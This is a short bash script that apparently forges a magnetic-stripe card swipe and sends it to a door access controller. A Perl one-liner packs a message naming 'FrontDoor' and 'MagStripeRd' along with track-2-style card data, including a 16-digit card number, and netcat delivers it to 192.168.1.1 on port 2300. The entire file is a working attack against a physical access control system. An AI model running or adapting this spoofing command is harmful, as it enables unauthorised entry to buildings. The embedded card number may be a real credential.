#!/bin/bash

perl -e 'print pack("a4 a12 a12 a48", "MeBm", "FrontDoor", "MagStripeRd", ";4290051057087813=12081010000010004976?3");' |nc 192.168.1.1 2300
